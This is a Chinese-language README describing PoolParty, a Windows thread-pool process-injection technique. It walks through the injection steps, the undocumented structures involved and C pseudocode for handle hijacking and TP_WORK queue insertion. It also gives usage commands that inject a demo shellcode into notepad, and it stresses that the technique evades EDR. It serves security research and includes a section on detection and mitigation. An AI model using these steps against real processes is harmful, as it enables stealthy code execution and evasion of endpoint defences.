# PoolParty - Windows Thread Pool 进程注入

## 技术概述

PoolParty 是一套利用 Windows Thread Pool（线程池）内部机制实现的进程注入技术集合。由 SafeBreach Labs 的 Alon Leviev 在 Black Hat EU 2023 上发表。该技术通过操纵目标进程的线程池结构，实现了高度隐蔽的代码注入，完全避开了传统的 `CreateRemoteThread` 检测。

**原始项目**: https://github.com/SafeBreach-Labs/PoolParty
**Black Hat 演讲**: The Pool Party You Will Never Forget: New Process Injection Techniques Using Windows Thread Pools
**作者**: Alon Leviev (@_0xDeku)

## PoolParty 技术家族

原始项目包含 8 个变体，每个变体利用不同的线程池工作项类型：

| 变体 ID | 变体名称 | 技术描述 |
|---------|---------|---------|
| 1 | WorkerFactoryStartRoutineOverwrite | 覆盖 Worker Factory 的启动例程 |
| 2 | RemoteTpWorkInsertion | 插入 TP_WORK 工作项（本实现） |
| 3 | RemoteTpWaitInsertion | 插入 TP_WAIT 工作项（等待事件） |
| 4 | RemoteTpIoInsertion | 插入 TP_IO 工作项（文件 I/O） |
| 5 | RemoteTpAlpcInsertion | 插入 TP_ALPC 工作项（ALPC 端口） |
| 6 | RemoteTpJobInsertion | 插入 TP_JOB 工作项（Job 对象） |
| 7 | RemoteTpDirectInsertion | 插入 TP_DIRECT 工作项（直接插入） |
| 8 | RemoteTpTimerInsertion | 插入 TP_TIMER 工作项（定时器） |

本实现选择了**变体 2：RemoteTpWorkInsertion**，这是最直接和经典的变体。

## 核心原理

### Windows Thread Pool 架构

Windows 线程池是一个复杂的内核对象系统，主要组件：

```
┌─────────────────────────────────────────────────────────────┐
│ 目标进程地址空间                                              │
│                                                              │
│  ┌────────────────────────────────────────────────────┐     │
│  │  TP_POOL（线程池）                                   │     │
│  │  ┌──────────────────────────────────────────────┐  │     │
│  │  │  TaskQueue[HIGH]  ←─ 双向链表                 │  │     │
│  │  │  TaskQueue[NORMAL]                            │  │     │
│  │  │  TaskQueue[LOW]                               │  │     │
│  │  │  WorkerFactory ──→ 指向 Worker Factory        │  │     │
│  │  │  CompletionPort ──→ I/O Completion Port      │  │     │
│  │  └──────────────────────────────────────────────┘  │     │
│  └────────────────────────────────────────────────────┘     │
│           ↑                                                  │
│           │ StartParameter 指针                              │
│           │                                                  │
│  ┌────────────────────────────────────────────────────┐     │
│  │  Worker Factory（工作线程工厂）                      │     │
│  │  - StartRoutine: 线程启动函数                        │     │
│  │  - StartParameter: 指向 TP_POOL                      │     │
│  │  - TotalWorkerCount: 当前工作线程数                   │     │
│  └────────────────────────────────────────────────────┘     │
│                                                              │
│  ┌────────────────────────────────────────────────────┐     │
│  │  TP_WORK（工作项）                                   │     │
│  │  ┌──────────────────────────────────────────────┐  │     │
│  │  │  CleanupGroupMember                          │  │     │
│  │  │    - Pool ──→ 指向 TP_POOL                    │  │     │
│  │  │    - Callback ──→ shellcode 地址              │  │     │
│  │  │  Task                                        │  │     │
│  │  │    - ListEntry (Flink/Blink) ←─ 链表节点     │  │     │
│  │  │  WorkState                                   │  │     │
│  │  │    - Insertable: 1                           │  │     │
│  │  └──────────────────────────────────────────────┘  │     │
│  └────────────────────────────────────────────────────┘     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 注入流程（变体 2：TP_WORK）

```
步骤 1: 句柄劫持
┌──────────────────────────────────────────────────────┐
│ 注入进程                                               │
│ ├─> OpenProcess(目标进程)                             │
│ ├─> NtQueryInformationProcess(ProcessHandleInformation)│
│ │     └─> 获取目标进程的所有句柄信息                     │
│ ├─> 遍历句柄，查找 "TpWorkerFactory" 类型              │
│ └─> DuplicateHandle ──→ 劫持 Worker Factory 句柄      │
└──────────────────────────────────────────────────────┘
                    ↓
步骤 2: 信息查询
┌──────────────────────────────────────────────────────┐
│ NtQueryInformationWorkerFactory                       │
│ ├─> 查询 Worker Factory 基本信息                      │
│ └─> 获取 StartParameter（指向 TP_POOL）               │
└──────────────────────────────────────────────────────┘
                    ↓
步骤 3: 内存准备
┌──────────────────────────────────────────────────────┐
│ ├─> VirtualAllocEx: 分配 shellcode 内存              │
│ └─> WriteProcessMemory: 写入 shellcode                │
└──────────────────────────────────────────────────────┘
                    ↓
步骤 4: 读取 TP_POOL
┌──────────────────────────────────────────────────────┐
│ ReadProcessMemory                                     │
│ ├─> 读取目标进程的 TP_POOL 结构                       │
│ └─> 读取 TaskQueue[HIGH] 的链表头                     │
└──────────────────────────────────────────────────────┘
                    ↓
步骤 5: 创建 TP_WORK
┌──────────────────────────────────────────────────────┐
│ 在本地创建 TP_WORK                                     │
│ ├─> CreateThreadpoolWork(shellcode_address)          │
│ ├─> 修改 Pool 指针 ──→ 目标进程的 TP_POOL              │
│ ├─> 修改 ListEntry (Flink/Blink) ──→ 指向目标队列     │
│ └─> 设置 WorkState.Insertable = 1                     │
└──────────────────────────────────────────────────────┘
                    ↓
步骤 6: 注入 TP_WORK
┌──────────────────────────────────────────────────────┐
│ ├─> VirtualAllocEx: 在目标进程分配 TP_WORK 内存       │
│ └─> WriteProcessMemory: 写入修改后的 TP_WORK          │
└──────────────────────────────────────────────────────┘
                    ↓
步骤 7: 修改任务队列
┌──────────────────────────────────────────────────────┐
│ 修改 TaskQueue[HIGH]->Queue 链表                      │
│ ├─> 将 Flink 指向我们的 TP_WORK->Task.ListEntry       │
│ └─> 将 Blink 指向我们的 TP_WORK->Task.ListEntry       │
└──────────────────────────────────────────────────────┘
                    ↓
步骤 8: 触发执行
┌──────────────────────────────────────────────────────┐
│ 目标进程的工作线程                                      │
│ ├─> 从任务队列中出队                                   │
│ ├─> 发现我们注入的 TP_WORK                            │
│ ├─> 调用 Callback ──→ shellcode                       │
│ └─> 执行注入的代码                                     │
└──────────────────────────────────────────────────────┘
```

### 关键数据结构

#### TP_POOL（线程池）

```c
typedef struct _FULL_TP_POOL {
    TPP_REFCOUNT Refcount;
    LONG Padding_239;
    TPP_POOL_QUEUE_STATE QueueState;
    TPP_QUEUE* TaskQueue[3];      // HIGH, NORMAL, LOW 优先级队列
    TPP_NUMA_NODE* NumaNode;
    PVOID ProximityInfo;
    PVOID WorkerFactory;           // 指向 Worker Factory 对象
    PVOID CompletionPort;          // I/O Completion Port
    SRWLOCK Lock;
    LIST_ENTRY PoolObjectList;
    LIST_ENTRY WorkerList;
    TPP_TIMER_QUEUE TimerQueue;
    // ... 更多字段
} FULL_TP_POOL, *PFULL_TP_POOL;
```

#### TP_WORK（工作项）

```c
typedef struct _FULL_TP_WORK {
    TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;  // 包含 Pool 指针和 Callback
    TP_TASK Task;                                  // 包含 ListEntry（链表节点）
    TPP_WORK_STATE WorkState;                      // Insertable 标志
    INT32 Padding[1];
} FULL_TP_WORK, *PFULL_TP_WORK;
```

#### WORKER_FACTORY_BASIC_INFORMATION

```c
typedef struct _WORKER_FACTORY_BASIC_INFORMATION {
    LARGE_INTEGER Timeout;
    LARGE_INTEGER RetryTimeout;
    LARGE_INTEGER IdleTimeout;
    // ...
    ULONG TotalWorkerCount;
    ULONG ReleaseCount;
    LONGLONG InfiniteWaitGoal;
    PVOID StartRoutine;
    PVOID StartParameter;          // 指向 TP_POOL！
    HANDLE ProcessId;
    SIZE_T StackReserve;
    SIZE_T StackCommit;
    NTSTATUS LastThreadCreationStatus;
} WORKER_FACTORY_BASIC_INFORMATION;
```

## 技术优势

### 1. 极高的隐蔽性

- ✅ **无 CreateRemoteThread**: 不使用传统的远程线程创建 API
- ✅ **无 QueueUserAPC**: 不使用 APC 注入
- ✅ **无 SetWindowsHookEx**: 不使用钩子注入
- ✅ **利用合法线程**: 代码在目标进程的合法工作线程中执行
- ✅ **EDR 难以检测**: 操作的是进程内部数据结构，没有可疑的跨进程 API 调用

### 2. 技术创新性

- 🎯 **首次利用**: 首次公开利用 Thread Pool 内部结构进行注入
- 🎯 **未文档化**: 大量使用 Windows 未文档化的内部结构
- 🎯 **逆向工程**: 需要深入的内核对象逆向工程知识
- 🎯 **多种变体**: 提供 8 种不同的注入路径

### 3. 实战价值

- ⚡ **稳定执行**: 利用线程池的任务调度机制
- ⚡ **自然触发**: 工作线程在正常运行时自动执行
- ⚡ **进程无感**: 目标进程无需交互即可触发

## 技术限制

### 1. Windows 版本

- ⚠️ **Windows 7+**: 需要 Windows 7 或更高版本
- ⚠️ **结构依赖**: 依赖特定版本的 Thread Pool 内部结构
- ⚠️ **可能失效**: 未来 Windows 更新可能改变结构布局

### 2. 权限要求

- 🔒 **PROCESS_VM_READ**: 需要读取目标进程内存
- 🔒 **PROCESS_VM_WRITE**: 需要写入目标进程内存
- 🔒 **PROCESS_VM_OPERATION**: 需要内存操作权限
- 🔒 **PROCESS_DUP_HANDLE**: 需要复制句柄权限
- 🔒 **PROCESS_QUERY_INFORMATION**: 需要查询进程信息权限

### 3. 技术挑战

- 🛠️ **复杂结构**: Thread Pool 结构非常复杂（200+ 字节）
- 🛠️ **链表操作**: 需要正确操作双向链表
- 🛠️ **时序问题**: 可能存在竞态条件
- 🛠️ **调试困难**: 涉及多进程、多线程调试

## 检测与防御

### 检测方法

1. **监控句柄操作**:
   ```c
   DuplicateHandle(*, *, *, *, *, *, *)  // 复制 TpWorkerFactory 句柄
   ```

2. **监控未文档化 API**:
   ```c
   NtQueryInformationWorkerFactory(*, WorkerFactoryBasicInformation, *, *, *)
   ```

3. **内存扫描**:
   - 扫描目标进程的 TP_POOL 结构
   - 检查 TaskQueue 链表的完整性
   - 检测异常的 TP_WORK 结构（Pool 指针不匹配）

4. **行为分析**:
   - 跨进程内存读取 + 跨进程内存写入 + DuplicateHandle 组合
   - 大量 ReadProcessMemory 调用读取结构化数据

### 防御建议

1. **EDR/AV 规则**:
   - 监控 `NtQueryInformationProcess` 与 `ProcessHandleInformation` 组合
   - 监控 `NtQueryInformationWorkerFactory` 调用
   - 检测 `DuplicateHandle` 对 `TpWorkerFactory` 类型的操作

2. **内核回调**:
   - 使用内核驱动监控 Thread Pool 对象的修改
   - 检测异常的任务队列插入

3. **内存保护**:
   - 使用 Control Flow Guard (CFG)
   - 使用 Arbitrary Code Guard (ACG)
   - 启用 CET (Control-flow Enforcement Technology)

4. **进程隔离**:
   - 使用 AppContainer 沙箱
   - 限制跨进程句柄访问

## 实现代码分析

### 核心函数

**1. 句柄劫持**

```c
HANDLE HijackWorkerFactoryHandle(HANDLE hProcess) {
    // 查询目标进程的所有句柄
    NtQueryInformationProcess(hProcess, ProcessHandleInformation, ...);

    // 遍历句柄
    for (i = 0; i < handleInfo->NumberOfHandles; i++) {
        // 复制句柄到本进程
        DuplicateHandle(hProcess, handle, GetCurrentProcess(), ...);

        // 查询对象类型
        NtQueryObject(hDuplicated, ObjectTypeInformation, ...);

        // 检查是否为 "TpWorkerFactory"
        if (TypeName == L"TpWorkerFactory") {
            return hDuplicated;
        }
    }
}
```

**2. 查询 Worker Factory**

```c
BOOL QueryWorkerFactoryInformation(HANDLE hWorkerFactory, ...) {
    NtQueryInformationWorkerFactory(
        hWorkerFactory,
        WorkerFactoryBasicInformation,
        &info,
        sizeof(info),
        NULL
    );

    // info.StartParameter 指向目标进程的 TP_POOL
    return TRUE;
}
```

**3. 创建并注入 TP_WORK**

```c
// 读取目标进程的 TP_POOL
ReadProcessMemory(hProcess, pTpPool, &targetTpPool, ...);

// 在本地创建 TP_WORK
PTP_WORK pTpWork = CreateThreadpoolWork(shellcode_callback, NULL, NULL);

// 修改 TP_WORK 结构
pFullTpWork->CleanupGroupMember.Pool = targetTpPool_address;
pFullTpWork->Task.ListEntry.Flink = &targetTpPool.TaskQueue[HIGH]->Queue;
pFullTpWork->Task.ListEntry.Blink = &targetTpPool.TaskQueue[HIGH]->Queue;
pFullTpWork->WorkState.Insertable = 1;

// 写入目标进程
VirtualAllocEx(hProcess, sizeof(FULL_TP_WORK), ...);
WriteProcessMemory(hProcess, pRemoteTpWork, pFullTpWork, ...);

// 修改任务队列链表
WriteProcessMemory(hProcess, &targetTpPool.TaskQueue[HIGH]->Queue.Flink,
                   &pRemoteTpWork->Task.ListEntry, ...);
WriteProcessMemory(hProcess, &targetTpPool.TaskQueue[HIGH]->Queue.Blink,
                   &pRemoteTpWork->Task.ListEntry, ...);
```

## 使用方法

### 快速测试（推荐）

```bash
cd techniques/37-poolparty
chmod +x test.sh
./test.sh
```

测试脚本会自动：
1. 启动notepad.exe
2. 获取进程PID
3. 使用变体2进行注入
4. 显示执行结果

### 手动使用

```bash
# 1. 启动目标进程
notepad.exe &

# 2. 获取PID
tasklist | grep notepad.exe

# 3. 执行注入（使用变体2：RemoteTpWorkInsertion）
./PoolParty.exe -V 2 -P <PID>

# 4. 与notepad交互以触发shellcode
# 预期：弹出MessageBox显示"Injected! PoolParty TP_WORK"
```

### 编译说明

**本实现使用 SafeBreach Labs 官方源代码**

```bash
cd techniques/37-poolparty

# 使用 Visual Studio 2022 MSBuild 编译
./build.sh

# 输出位置
# - PoolParty.exe (当前目录，自动复制)
# - src/x64/Release/PoolParty.exe (原始输出)
```

**要求**:
- Visual Studio 2022 (Community/Professional/Enterprise)
- Boost 1.82.0 (通过 NuGet 自动安装)
- Windows SDK

**源代码文件**:
```
techniques/37-poolparty/
├── PoolParty.sln          # Visual Studio 解决方案
├── src/                   # 官方源代码
│   ├── main.cpp
│   ├── PoolParty.cpp      # 主注入逻辑
│   ├── WorkerFactory.cpp  # Worker Factory 劫持
│   ├── ThreadPool.cpp     # 线程池操作
│   ├── Native.hpp         # NT API 封装
│   └── x64/               # 编译输出目录
├── build.sh               # 编译脚本
└── test.sh                # 自动化测试
```

### 预期输出

```
[*] PoolParty - TP_WORK Injection Technique
[*] Variant: RemoteTpWorkInsertion

[+] Found target process: PID 1234
[+] Starting PoolParty attack against PID: 1234
[+] Retrieved 127 handles from target process
[+] Hijacked Worker Factory handle: 0x00000074
[+] Worker Factory StartParameter (TP_POOL): 0x000001A2B3C4D000
[+] Total worker count: 2
[+] Allocated shellcode memory at: 0x000001A2B3E5F000
[+] Written shellcode to target process
[+] Read target process's TP_POOL structure
[+] Created local TP_WORK structure
[+] Modified TP_WORK to point to target process's TP_POOL
[+] Allocated TP_WORK memory in target process: 0x000001A2B3F6G000
[+] Written TP_WORK structure to target process
[+] Modified target process's task queue to point to our TP_WORK

[+] PoolParty attack completed successfully!
[!] The shellcode will execute when a worker thread picks up the task
[!] Try interacting with notepad.exe to trigger execution
```

## 与其他技术的对比

### vs CreateRemoteThread

| 特性 | PoolParty | CreateRemoteThread |
|-----|-----------|-------------------|
| API 调用 | 无 CRT | 直接调用 CRT |
| 隐蔽性 | 极高 | 低 |
| EDR 检测 | 困难 | 容易 |
| 技术复杂度 | 非常高 | 低 |
| 触发时机 | 任务队列调度 | 立即执行 |

### vs SetProcessInstrumentationCallback

| 特性 | PoolParty | SetProcessInjection |
|-----|-----------|---------------------|
| 核心机制 | Thread Pool | ProcessInstrumentationCallback |
| 触发方式 | 工作线程出队 | Syscall 拦截 |
| Windows 版本 | 7+ | 10 1703+ |
| 结构复杂度 | 极高 | 中等 |
| 稳定性 | 高 | 依赖 syscall 频率 |

### vs APC Injection

| 特性 | PoolParty | APC Injection |
|-----|-----------|---------------|
| API 使用 | DuplicateHandle + RPM/WPM | QueueUserAPC |
| 目标线程 | 工作线程 | Alertable 线程 |
| 检测难度 | 非常高 | 中等 |
| 实现复杂度 | 非常高 | 低 |

## 技术参考

- **原始项目**: https://github.com/SafeBreach-Labs/PoolParty
- **Black Hat EU 2023**: The Pool Party You Will Never Forget
- **作者**: Alon Leviev (@_0xDeku)
- **SafeBreach Labs**: https://www.safebreach.com/
- **相关技术**: SetProcessInjection (技术 36), Mapping Injection (技术 35)

## 许可证

本实现仅用于安全研究和教育目的。
